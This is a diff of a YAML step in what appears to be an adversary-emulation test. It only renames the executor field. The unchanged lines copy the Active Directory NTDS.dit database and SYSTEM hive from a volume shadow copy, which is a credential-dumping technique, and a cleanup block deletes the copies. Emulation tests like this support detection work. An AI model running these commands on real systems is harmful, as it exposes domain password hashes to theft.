@@ -33,10 +33,10 @@ steps:
         copy {{.Args.vsc_name}}\Windows\NTDS\NTDS.dit {{.Args.extract_path}}\ntds.dit
         copy {{.Args.vsc_name}}\Windows\System32\config\SYSTEM {{.Args.extract_path}}\VSC_SYSTEM_HIVE
         reg save HKLM\SYSTEM {{.Args.extract_path}}\SYSTEM_HIVE
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             del "{{.Args.extract_path}}\ntds.dit"        >nul 2> nul
             del "{{.Args.extract_path}}\VSC_SYSTEM_HIVE" >nul 2> nul
             del "{{.Args.extract_path}}\SYSTEM_HIVE"     >nul 2> nul
-        executor: command_prompt
+        executor: cmd
